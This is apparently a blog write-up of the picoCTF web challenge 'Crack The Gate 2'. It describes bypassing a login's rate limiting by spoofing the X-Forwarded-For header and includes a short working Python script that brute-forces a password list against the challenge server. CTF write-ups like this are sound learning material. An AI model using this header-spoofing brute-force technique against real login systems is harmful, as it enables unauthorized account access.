+++
date = '2026-04-16'
draft = false
title = 'Pico Crack The Gate 2 writeup'
ShowToc = true
tags = ["picoCTF", "web"]
+++

## Overview

The login system has been upgraded with a basic rate-limiting mechanism that locks out repeated failed attempts from the same source. We’ve received a tip that the system might still trust user-controlled headers. Your objective is to bypass the rate-limiting restriction and log in using the known email address: ctf-player@picoctf.org and uncover the hidden secret.


## Identifying the vulnerabilities

The challenge hints at modifying our headers, and the `X-Forwarded-For` header was the one responsible for rate limiting. We got a `passwords.txt` file, it wasn't that long, but I wanted to practice python anyways; since I always dread doing it, I'm trying to force myself to get comfortable with it.

Here was my little script:

```python
import requests
from utils.pretty_print import pretty_print

url = 'http://amiable-citadel.picoctf.net:50639/login'

i=50
with open("/home/kali/Downloads/passwords.txt") as f:
    for line in f:
        line_clean = line.strip()
        data = {
            "email":"ctf-player@picoctf.org",
            "password":line
        }
        headers = {
            "X-Forwarded-For":str(i)
        }
        i+=1
        res = requests.post(url, data=data, headers=headers)
        pretty_print(res)
```

And here is the flag:

![challenge-screenshot](c.png#center)
